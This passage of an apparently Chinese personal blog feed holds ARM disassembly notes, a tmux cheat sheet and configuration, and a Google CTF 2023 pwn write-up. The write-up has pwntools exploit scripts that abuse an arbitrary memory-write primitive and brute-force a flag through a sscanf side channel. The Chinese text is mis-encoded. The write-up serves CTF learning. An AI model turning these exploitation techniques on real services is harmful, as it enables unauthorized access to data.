class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00010420</span>                               ; <span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">.text:00010420                               EXPORT main</span><br><span class="line">.text:00010420                               main                                    ; DATA XREF: _start+<span class="number">30</span>â†‘o</span><br><span class="line">.text:<span class="number">00010420</span>                                                                       ; .got:main_ptrâ†“o</span><br><span class="line">.text:<span class="number">00010420</span></span><br><span class="line">.text:<span class="number">00010420</span>                               x= <span class="number">-8</span></span><br><span class="line">.text:<span class="number">00010420</span></span><br><span class="line">.text:<span class="number">00010420</span> <span class="number">00</span> <span class="number">48</span> <span class="number">2</span>D E9                   PUSH    &#123;R11,LR&#125;</span><br><span class="line">.text:<span class="number">00010424</span> <span class="number">04</span> B0 <span class="number">8</span>D E2                   ADD     R11, SP, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">00010428</span> <span class="number">08</span> D0 <span class="number">4</span>D E2                   SUB     SP, SP, #<span class="number">8</span></span><br><span class="line">.text:<span class="number">0001042</span>C <span class="number">24</span> <span class="number">30</span> <span class="number">9F</span> E5                   LDR     R3, =<span class="number">0x12345678</span></span><br><span class="line">.text:<span class="number">00010430</span> <span class="number">08</span> <span class="number">30</span> <span class="number">0B</span> E5                   STR     R3, [R11,<span class="meta">#x]</span></span><br><span class="line">.text:<span class="number">00010434</span> <span class="number">20</span> <span class="number">00</span> <span class="number">9F</span> E5                   LDR     R0, =aHelloWorld                ; <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">.text:<span class="number">00010438</span> B1 FF FF EB                   BL      <span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0001043</span>C <span class="number">08</span> <span class="number">10</span> <span class="number">1B</span> E5                   LDR     R1, [R11,<span class="meta">#x]</span></span><br><span class="line">.text:<span class="number">00010440</span> <span class="number">18</span> <span class="number">00</span> <span class="number">9F</span> E5                   LDR     R0, =aX                         ; <span class="string">&quot;%x&quot;</span></span><br><span class="line">.text:<span class="number">00010444</span> AE FF FF EB                   BL      <span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">00010448</span> <span class="number">00</span> <span class="number">30</span> A0 E3                   MOV     R3, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">0001044</span>C <span class="number">03</span> <span class="number">00</span> A0 E1                   MOV     R0, R3</span><br><span class="line">.text:<span class="number">00010450</span> <span class="number">04</span> D0 <span class="number">4B</span> E2                   SUB     SP, R11, #<span class="number">4</span></span><br><span class="line">.text:<span class="number">00010454</span> <span class="number">00</span> <span class="number">88</span> BD E8                   POP     &#123;R11,PC&#125;</span><br><span class="line">.text:<span class="number">00010454</span>                               ; End of function main</span><br><span class="line">.text:<span class="number">00010454</span></span><br><span class="line">.text:<span class="number">00010454</span>                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00010458</span> <span class="number">78</span> <span class="number">56</span> <span class="number">34</span> <span class="number">12</span>                   dword_10458 DCD <span class="number">0x12345678</span>              ; DATA XREF: main+Câ†‘r</span><br><span class="line">.text:<span class="number">0001045</span>C                               ; <span class="type">char</span> *<span class="type">const</span> format</span><br><span class="line">.text:<span class="number">0001045</span>C <span class="number">00</span> <span class="number">05</span> <span class="number">01</span> <span class="number">00</span>                   format DCD aHelloWorld                  ; DATA XREF: main+<span class="number">14</span>â†‘r</span><br><span class="line">.text:<span class="number">0001045</span>C                                                                       ; <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">.text:<span class="number">00010460</span>                               ; <span class="type">char</span> *<span class="type">const</span> off_10460</span><br><span class="line">.text:<span class="number">00010460</span> <span class="number">0</span>C <span class="number">05</span> <span class="number">01</span> <span class="number">00</span>                   off_10460 DCD aX                        ; DATA XREF: main+<span class="number">20</span>â†‘r</span><br><span class="line">.text:<span class="number">00010460</span>                               ; .text ends                            ; <span class="string">&quot;%x&quot;</span></span><br><span class="line">.text:<span class="number">00010460</span></span><br><span class="line">.fini:<span class="number">00010464</span>                               ; ========================================================</span><br><span class="line">.rodata:<span class="number">00010500</span> <span class="number">68</span> <span class="number">65</span> <span class="number">6</span>C <span class="number">6</span>C <span class="number">6F</span> <span class="number">2</span>C <span class="number">77</span> <span class="number">6F</span> <span class="number">72</span> <span class="number">6</span>C+aHelloWorld DCB <span class="string">&quot;hello,world&quot;</span>,<span class="number">0</span>         ; DATA XREF: main+<span class="number">14</span>â†‘o</span><br></pre></td></tr></table></figure><p>idaé‡Œåæ±‡ç¼–å‡ºæ¥çš„<code> LDR     R3, =0x12345678</code>è¿™ç§å¸¦ç­‰å·çš„ä¸€èˆ¬éƒ½æ˜¯idaè§£æå¥½çš„æŒ‰pcåç§»æ¥å¯»å€çš„(ldr r3,[pc,#imm])ã€ï¼Œidaé‡ŒæŒ‰qå¯ä»¥æŸ¥çœ‹åŸå§‹æŒ‡ä»¤</p><p><img src="/2023/07/14/arm-asm/image-20230719203353466.png" alt="image-20230719203353466"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tmux</title>
      <link href="/2023/07/11/tmux/"/>
      <url>/2023/07/11/tmux/</url>
      
        <content type="html"><![CDATA[<p><a href="https://tmuxcheatsheet.com/">https://tmuxcheatsheet.com/</a></p><p><img src="/2023/07/11/tmux/image-20230922234753859.png" alt="image-20230922234753859"></p><p>å‰ç¼€prefix:ctrl b</p><p>åˆ›å»ºæ–°çª—å£:pre+c</p><p>åˆ‡æ¢çª—å£:pre+numberï¼Œæˆ–pre+p pre+n</p><p>å…³é—­çª—å£:pre+&amp;</p><p>å·¦å³åˆ†å±:pre+%</p><p>ä¸Šä¸‹åˆ†å±:pre+â€œ</p><p>å…³é—­åˆ†å±:pre+x</p><p>æœ€å¤§åŒ–åˆ†å±:pre+z</p><p>åˆ‡æ¢åˆ†å±:pre+æ–¹å‘é”®æˆ–pre+q+number</p><p>ç©ºé—´é¢„è§ˆ:pre+w</p><p>è„±ç¦»å·¥ä½œç©ºé—´detached:pre+d</p><p>è¿æ¥å·¥ä½œç©ºé—´attach:tmux a (tmux attach)</p><p>æŸ¥çœ‹æ‰€ä»¥å·¥ä½œç©ºé—´:tmux ls</p><p>è¿æ¥æŒ‡å®šå·¥ä½œç©ºé—´:tmux attach -t [number]</p><p><strong>~&#x2F;.tmux.conf</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span>-option -sa terminal-overrides <span class="string">&quot;,xterm*:Tc&quot;</span></span><br><span class="line"><span class="built_in">set</span> -g <span class="keyword">default</span>-terminal <span class="string">&quot;screen-256color&quot;</span></span><br><span class="line"><span class="built_in">set</span>-option -ga terminal-overrides <span class="string">&quot;,*256col*:Tc&quot;</span></span><br><span class="line">setw -g mode-keys vi</span><br><span class="line"><span class="built_in">set</span> -g status-keys vi</span><br><span class="line"><span class="meta"># set-option default-path <span class="string">&quot;$PWD&quot;</span></span></span><br><span class="line"><span class="built_in">set</span> -s escape-time <span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> -sg repeat-time <span class="number">300</span></span><br><span class="line"><span class="built_in">set</span> -s focus-events on</span><br><span class="line"><span class="built_in">set</span> -g mouse on</span><br><span class="line">unbind -T copy-mode-vi MouseDragEnd1Pane</span><br><span class="line">bind v copy-mode # ç»‘å®šescé”®ä¸ºè¿›å…¥å¤åˆ¶æ¨¡å¼</span><br><span class="line">bind -T copy-mode-vi v send-keys -X begin-selection</span><br><span class="line">bind -T copy-mode-vi y send-keys -X copy-selection-and-cancel</span><br><span class="line"><span class="meta"># bufferç¼“å­˜å¤åˆ¶åˆ°Linuxç³»ç»Ÿç²˜è´´æ¿</span></span><br><span class="line">bind C-c run <span class="string">&quot; tmux save-buffer - | xclip -i -sel clipboard&quot;</span></span><br><span class="line"># Linuxç³»ç»Ÿç²˜è´´æ¿å†…å®¹å¤åˆ¶åˆ°ä¼šè¯</span><br><span class="line">bind C-v run <span class="string">&quot; tmux set-buffer \&quot;$(xclip -o -sel clipboard)\&quot;; tmux paste-buffer&quot;</span></span><br><span class="line"><span class="built_in">set</span> -sg <span class="built_in">exit</span>-empty on</span><br><span class="line"><span class="built_in">set</span> -q -g status-utf8 on</span><br><span class="line"><span class="built_in">set</span> -g history-limit <span class="number">5000</span></span><br><span class="line">setw -q -g utf8 on</span><br><span class="line"><span class="built_in">set</span> -g visual-activity off</span><br><span class="line">setw -g monitor-activity off</span><br><span class="line">setw -g monitor-bell off</span><br><span class="line"># ä½¿ç”¨ Ctrl + b + hjkl </span><br><span class="line">bind h select-pane -L                       # å®šä½åˆ°å·¦è¾¹çª—å£çš„å¿«æ·é”®</span><br><span class="line">bind j select-pane -D                       # å®šä½åˆ°ä¸Šè¾¹çª—å£çš„å¿«æ·é”®</span><br><span class="line">bind k select-pane -U                       # å®šä½åˆ°ä¸‹æ–¹çª—å£çš„å¿«æ·é”®</span><br><span class="line">bind l select-pane -R                       # å®šä½åˆ°å³è¾¹çª—å£çš„å¿«æ·é”®</span><br><span class="line">bind -r J resize-pane -D <span class="number">5</span></span><br><span class="line">bind -r K resize-pane -U <span class="number">5</span></span><br><span class="line">bind -r L resize-pane -R <span class="number">5</span></span><br><span class="line">bind -r H resize-pane -L <span class="number">5</span></span><br><span class="line">bind -r m resize-pane -Z</span><br><span class="line">#ç»‘å®š|å·¦å³åˆ†å± -ä¸Šä¸‹åˆ†å±</span><br><span class="line">unbind %</span><br><span class="line">bind | split-window -h</span><br><span class="line">unbind <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">bind _ split-window -v</span><br><span class="line"><span class="meta">#pulg</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;tmux-plugins/tpm&#x27;</span></span><br><span class="line"><span class="meta">#ctrl +hjkl ä¸åŒPaneç§»åŠ¨</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;christoomey/vim-tmux-navigator&#x27;</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;jimeh/tmux-themepack&#x27;</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;tmux-plugins/tmux-resurrect&#x27;</span> <span class="meta"># persist tmux sessions after computer restart</span></span><br><span class="line"><span class="built_in">set</span> -g @plugin <span class="string">&#x27;tmux-plugins/tmux-continuum&#x27;</span> <span class="meta"># automatically saves sessions for you every 15 minutes</span></span><br><span class="line"><span class="built_in">set</span> -g @resurrect-capture-pane-contents <span class="string">&#x27;on&#x27;</span></span><br><span class="line"><span class="built_in">set</span> -g @themepack <span class="string">&#x27;powerline/block/green&#x27;</span></span><br><span class="line"><span class="meta"># set -g status-right <span class="string">&#x27;Continuum status: #&#123;continuum_status&#125;&#x27;</span></span></span><br><span class="line">run <span class="string">&#x27;~/.tmux/plugins/tpm/tpm&#x27;</span> # Initialize Tmux plug manger</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 googlectf pwn</title>
      <link href="/2023/07/10/googlectf-pwn/"/>
      <url>/2023/07/10/googlectf-pwn/</url>
      
        <content type="html"><![CDATA[<h3 id="WRITE-FLAG-WHERE"><a href="#WRITE-FLAG-WHERE" class="headerlink" title="WRITE-FLAG-WHERE"></a>WRITE-FLAG-WHERE</h3><p>æœ¬åœ°è°ƒè¯•çš„è¯Maximum number of open file descriptorsæœ€é«˜åˆ°1024ï¼Œæ‰€ä»¥æŠŠdup2 patchä¸ºå°äº1024çš„å€¼æˆ–è€…ä¿®æ”¹&#x2F;etc&#x2F;security&#x2F;limits.confæŠŠé™åˆ¶è°ƒé«˜</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~&gt; ulimit -a</span><br><span class="line">Maximum size of core files <span class="title function_">created</span>                           <span class="params">(kB, -c)</span> 0</span><br><span class="line">Maximum size of a processâ€™s data <span class="title function_">segment</span>                     <span class="params">(kB, -d)</span> unlimited</span><br><span class="line">Maximum size of files created by the <span class="title function_">shell</span>                   <span class="params">(kB, -f)</span> unlimited</span><br><span class="line">Maximum size that may be locked into <span class="title function_">memory</span>                  <span class="params">(kB, -l)</span> 628848</span><br><span class="line">Maximum resident <span class="built_in">set</span> <span class="title function_">size</span>                                    <span class="params">(kB, -m)</span> unlimited</span><br><span class="line">Maximum number of open file <span class="title function_">descriptors</span>                          <span class="params">(-n)</span> 1024</span><br><span class="line">Maximum <span class="built_in">stack</span> <span class="title function_">size</span>                                           <span class="params">(kB, -s)</span> 8192</span><br><span class="line">Maximum amount of cpu time in <span class="title function_">seconds</span>                   <span class="params">(seconds, -t)</span> unlimited</span><br><span class="line">Maximum number of processes available to a single <span class="title function_">user</span>           <span class="params">(-u)</span> 19340</span><br><span class="line">Maximum amount of virtual memory available to the <span class="title function_">shell</span>      <span class="params">(kB, -v)</span> unlimited</span><br></pre></td></tr></table></figure><p>æŠŠä¸‹é¢ä¸¢å¼ƒæµç»™nopæ‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v8 = open(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">2</span>);</span><br><span class="line">dup2(v8, <span class="number">0</span>);</span><br><span class="line">dup2(v8, <span class="number">1</span>);</span><br><span class="line">dup2(v8, <span class="number">2</span>);</span><br><span class="line">close(v8);</span><br></pre></td></tr></table></figure><blockquote><p><code>/dev/null</code> æ˜¯ Unix-like æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨ä½œæ•°æ®çš„ä½æ¡¶æˆ–é»‘æ´ã€‚å®ƒé€šå¸¸è¢«ç§°ä¸º â€œnull è®¾å¤‡â€ï¼Œå› ä¸ºå†™å…¥åˆ°å®ƒçš„ä»»ä½•æ•°æ®éƒ½ä¼šè¢«ä¸¢å¼ƒï¼Œä¸ä¼šäº§ç”Ÿä»»ä½•å½±å“ã€‚</p></blockquote><p>ç¨‹åºç»™äº†è¿›ç¨‹çš„mapså’Œå¾€è¿›ç¨‹ä»»æ„åœ°å€å†™flagçš„æœºä¼šï¼Œæ‰€ä»¥åªéœ€è¦æ”¹ä¸‹æŸä½ç½®å¯ä»¥è®©flagè¾“å‡ºå³å¯</p><p>æŠŠwhileå¾ªç¯é‡Œçš„dprintfçš„åœ°å€å†™å…¥flagå³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;wfw1.2023.ctfcompetition.com&#x27;, 1337)</span></span><br><span class="line">sh=process(<span class="string">&#x27;./chal_patch&#x27;</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;have a shot.\n&#x27;</span>)</span><br><span class="line">image_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">b&#x27;-&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;image_addr: &#x27;</span> + <span class="built_in">hex</span>(image_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x21e0</span>, <span class="number">80</span>))</span><br><span class="line">sh.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x21e0</span>, <span class="number">80</span>)).encode())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="WRITE-FLAG-WHERE2"><a href="#WRITE-FLAG-WHERE2" class="headerlink" title="WRITE-FLAG-WHERE2"></a>WRITE-FLAG-WHERE2</h3><p>é€»è¾‘å·®ä¸å¤šåªæ˜¯dprintfè·‘åˆ°äº†exitçš„ä¸‹é¢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000001440</span> E8 <span class="number">8B</span> FC FF FF                call    _exit</span><br><span class="line">.text:<span class="number">0000000000001440</span></span><br><span class="line">.text:<span class="number">0000000000001445</span>                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000001445</span> <span class="number">8B</span> <span class="number">45</span> F4                      mov     eax, [rbp+var_C]</span><br><span class="line">.text:<span class="number">0000000000001448</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">15</span> <span class="number">86</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span>          lea     rdx, aSomehowYouGotH            ; <span class="string">&quot;Somehow you got here??\n&quot;</span></span><br><span class="line">.text:<span class="number">000000000000144F</span> <span class="number">48</span> <span class="number">89</span> D6                      mov     rsi, rdx                        ; fmt</span><br><span class="line">.text:<span class="number">0000000000001452</span> <span class="number">89</span> C7                         mov     edi, eax                        ; fd</span><br><span class="line">.text:<span class="number">0000000000001454</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001459</span> E8 <span class="number">32</span> FC FF FF                call    _dprintf</span><br><span class="line">.text:<span class="number">0000000000001459</span></span><br><span class="line">.text:<span class="number">000000000000145</span>E E8 CD FB FF FF                call    _abort</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨flagçš„æ ¼å¼æ˜¯CTF{}</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x43&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;T&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x54&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;F&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x46&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7b&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7d&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">54</span>(T)    push rsp </span><br><span class="line"><span class="number">43</span> <span class="number">54</span>(CT)    push r12</span><br></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨pushæŒ‡ä»¤æ”¹å†™è·³è¿‡exit,ä»åå¾€å‰å†™CT,ç”¨å‰ä¸€ä¸ªTè¦†ç›–åä¸€ä¸ªCï¼Œå³ä¸ºCTTTTï¼Œå†æ”¹å†™è¾“å‡ºflagå³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;wfw2.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="meta"># io=process(<span class="string">&#x27;./chal_patch&#x27;</span>)</span></span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line">io.recvuntil(b<span class="number">&#x27;</span> the fluff\n<span class="number">&#x27;</span>)</span><br><span class="line">image_addr = <span class="type">int</span>(io.recvuntil(b<span class="number">&#x27;</span>-<span class="string">&#x27;, drop=True), 16)</span></span><br><span class="line"><span class="string">success(&#x27;</span>image_addr: <span class="string">&#x27; + hex(image_addr))</span></span><br><span class="line"><span class="string">io.recvuntil(b&#x27;</span>[vsyscall]\n<span class="number">&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">    io.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span>%(image_addr+<span class="number">0x1443</span>-i,<span class="number">2</span>)).encode())</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x20D5</span>, <span class="number">80</span>)).encode())</span><br><span class="line">io.sendline(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ä»c0keå¸ˆå‚…å‘¨æŠ¥é‚£é‡Œå·å­¦äº†ä¸€æ‰‹çˆ†ç ´</p><p>æ€è·¯å°±æ˜¯ä¿®æ”¹<code>if ( (unsigned int)__isoc99_sscanf(buf, &quot;0x%llx %u&quot;, &amp;n[1], n) != 2 || n[0] &gt; 0x7Fu )</code>ä¸­0x%llx %uçš„0ä¸ºflagä¸­çš„ä¸€ä½å€¼ï¼Œä¸‹ä¸€æ¬¡è¾“å…¥æ—¶ä»¥çŒœæµ‹çš„flagå€¼+x%llx %uçš„æ ¼å¼æ¥å‘é€æ•°æ®ï¼Œå¦‚æœä¸æ˜¯æ­£ç¡®çš„æ•°æ®å°±ä¼šæ— æ³•è§£ææ•°æ® (unsigned int)__isoc99_sscanf(buf, â€œ0x%llx %uâ€, &amp;n[1], n) !&#x3D; 2ç¨‹åºé€€å‡ºï¼Œå¦åˆ™æ­£å¸¸ä¸‹ä¸€æ¬¡è¯»å…¥</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">def <span class="title function_">leak</span><span class="params">(offset, chr)</span>:    </span><br><span class="line">    sh = remote(<span class="string">&#x27;wfw2.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)             </span><br><span class="line">    sh.recvuntil(b<span class="number">&#x27;f</span>luff\n<span class="number">&#x27;</span>)    </span><br><span class="line">    image_addr = <span class="type">int</span>(sh.recvuntil(b<span class="number">&#x27;</span>-<span class="string">&#x27;, drop=True), 16)    </span></span><br><span class="line"><span class="string">    sh.recvuntil(b&#x27;</span>\n\n\n<span class="number">&#x27;</span>)    </span><br><span class="line">    sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (image_addr+<span class="number">0x20BC</span>-offset, offset+<span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;0&#x27;</span>))    </span><br><span class="line">    sh.send((<span class="string">&#x27;%cx%lx %u\n&#x27;</span> % (chr, image_addr, <span class="number">0</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;0&#x27;</span>))    </span><br><span class="line">    try:        </span><br><span class="line">        sh.recvn(<span class="number">1</span>, timeout=<span class="number">1</span>)        </span><br><span class="line">        sh.close()        </span><br><span class="line">        <span class="keyword">return</span> True    </span><br><span class="line">    except EOFError:       </span><br><span class="line">        sh.close()        </span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;_&#123;&#125;?&#x27;</span> + <span class="built_in">string</span>.digits + <span class="built_in">string</span>.ascii_lowercase + <span class="built_in">string</span>.ascii_uppercase</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">while(True):    </span></span><br><span class="line"><span class="string">    find = False    </span></span><br><span class="line"><span class="string">    for chr in table:        </span></span><br><span class="line"><span class="string">        if leak(len(flag), chr):            </span></span><br><span class="line"><span class="string">            find = True            </span></span><br><span class="line"><span class="string">            flag += chr            </span></span><br><span class="line"><span class="string">            print(flag)            </span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    if not find:      </span></span><br><span class="line"><span class="string">        print(flag)              </span></span><br><span class="line"><span class="string">        break</span></span><br></pre></td></tr></table></figure><h3 id="WRITE-FLAG-WHERE3"><a href="#WRITE-FLAG-WHERE3" class="headerlink" title="WRITE-FLAG-WHERE3"></a>WRITE-FLAG-WHERE3</h3><p>å¤šäº†æ”¹å†™ä½ç½®çš„åˆ¤æ–­<code>|| *(_QWORD *)&amp;n[1] &gt;= (unsigned __int64)main - 20480 &amp;&amp; (unsigned __int64)main + 20480 &gt;= *(_QWORD *)&amp;n[1] )</code></p><p>ä¸èƒ½æ˜¯main-20480åˆ°main+20480ä¹‹é—´ï¼Œåªèƒ½æ—¶libcå’Œæ ˆåŒº</p><p>Exå¸ˆå‚…çš„æ€è·¯å°±æ˜¯æ”¹writeçš„çš„ç¬¬ä¸€ä¸ªå‚æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000114</span>A20</span><br><span class="line">.text:<span class="number">0000000000114</span>A20                               fd= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A20                               buf= qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A20                               count= qword ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A20 F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64                                 ; Alternative name is <span class="string">&#x27;__write&#x27;</span></span><br><span class="line">.text:<span class="number">0000000000114</span>A24 <span class="number">64</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov     eax, fs:<span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A2C <span class="number">85</span> C0                         test    eax, eax</span><br><span class="line">.text:<span class="number">0000000000114</span>A2E <span class="number">75</span> <span class="number">10</span>                         jnz     <span class="type">short</span> loc_114A40</span><br><span class="line">.text:<span class="number">0000000000114</span>A2E</span><br><span class="line">.text:<span class="number">0000000000114</span>A30 B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000114</span>A35 <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">0000000000114</span>A37 <span class="number">48</span> <span class="number">3</span>D <span class="number">00</span> F0 FF FF             cmp     rax, <span class="number">0F</span>FFFFFFFFFFFF000h</span><br><span class="line">.text:<span class="number">0000000000114</span>A3D <span class="number">77</span> <span class="number">51</span>                         ja      <span class="type">short</span> loc_114A90</span><br><span class="line">.text:<span class="number">0000000000114</span>A3D</span><br><span class="line">.text:<span class="number">0000000000114</span>A3F C3                            retn</span><br><span class="line">.text:<span class="number">0000000000114</span>A3F</span><br><span class="line">.text:<span class="number">0000000000114</span>A40                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000114</span>A40</span><br><span class="line">.text:<span class="number">0000000000114</span>A40                               loc_114A40:                             ; CODE XREF: write+Eâ†‘j</span><br><span class="line">.text:<span class="number">0000000000114</span>A40 <span class="number">48</span> <span class="number">83</span> EC <span class="number">28</span>                   sub     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A44 <span class="number">48</span> <span class="number">89</span> <span class="number">54</span> <span class="number">24</span> <span class="number">18</span>                mov     [rsp+<span class="number">28</span>h+count], rdx</span><br><span class="line">.text:<span class="number">0000000000114</span>A49 <span class="number">48</span> <span class="number">89</span> <span class="number">74</span> <span class="number">24</span> <span class="number">10</span>                mov     [rsp+<span class="number">28</span>h+buf], rsi</span><br><span class="line">.text:<span class="number">0000000000114</span>A4E <span class="number">89</span> <span class="number">7</span>C <span class="number">24</span> <span class="number">08</span>                   mov     dword ptr [rsp+<span class="number">28</span>h+fd], edi</span><br><span class="line">.text:<span class="number">0000000000114</span>A52 E8 <span class="number">19</span> C0 F7 FF                call    sub_90A70</span><br><span class="line">.text:<span class="number">0000000000114</span>A52</span><br><span class="line">.text:<span class="number">0000000000114</span>A57 <span class="number">48</span> <span class="number">8B</span> <span class="number">54</span> <span class="number">24</span> <span class="number">18</span>                mov     rdx, [rsp+<span class="number">28</span>h+count]            ; count</span><br><span class="line">.text:<span class="number">0000000000114</span>A5C <span class="number">48</span> <span class="number">8B</span> <span class="number">74</span> <span class="number">24</span> <span class="number">10</span>                mov     rsi, [rsp+<span class="number">28</span>h+buf]              ; buf</span><br><span class="line">.text:<span class="number">0000000000114</span>A61 <span class="number">41</span> <span class="number">89</span> C0                      mov     r8d, eax</span><br><span class="line">.text:<span class="number">0000000000114</span>A64 <span class="number">8B</span> <span class="number">7</span>C <span class="number">24</span> <span class="number">08</span>                   mov     edi, dword ptr [rsp+<span class="number">28</span>h+fd]     ; fd</span><br><span class="line">.text:<span class="number">0000000000114</span>A68 B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000114</span>A6D <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">0000000000114</span>A6F <span class="number">48</span> <span class="number">3</span>D <span class="number">00</span> F0 FF FF             cmp     rax, <span class="number">0F</span>FFFFFFFFFFFF000h</span><br><span class="line">.text:<span class="number">0000000000114</span>A75 <span class="number">77</span> <span class="number">31</span>                         ja      <span class="type">short</span> loc_114AA8</span><br><span class="line">.text:<span class="number">0000000000114</span>A75</span><br><span class="line">.text:<span class="number">0000000000114</span>A77</span><br><span class="line">.text:<span class="number">0000000000114</span>A77                               loc_114A77:                             ; 